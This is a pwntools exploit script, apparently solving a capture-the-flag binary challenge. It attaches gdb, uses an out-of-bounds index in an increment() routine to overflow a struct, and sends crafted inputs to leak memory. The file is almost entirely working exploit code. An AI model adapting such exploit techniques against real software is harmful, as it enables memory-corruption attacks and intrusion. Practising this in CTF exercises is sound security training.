#!/usr/bin/python3

from pwn import *
exe = ELF('challenge', checksec=False)

p = process(exe.path)


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


p.pie = False

gdb.attach(p, gdbscript='''
b*increment+31
b*increment+192
b*increment+446
c
''')
input()
# Idea: Increment() has maximum index is 9 and i is 10
# But structure map_data is just 9 and 3
# typedef struct map_data {
#     size_t bin_sizes[10];
#     map_entry bins[10][4];
# } map_data;
# --> Overflow

count = 0
for i in range(0x100):
    if (i*31) % 10 == 9:
        if count == 4:
            break
        sla(b'> ', b'1')
        sla(b'name: ', p8(i) + b'\0')
        sla(b'them: ', str(i).encode())
        count += 1

# After executing increment, rdi and rsi is set so just call print()
# to get the leak
sla(b'> ', b'1')
sla(b'name: ', p8(49) + b'\0')
sla(b'them: ', str(-0x4ad).encode())
p.interactive()
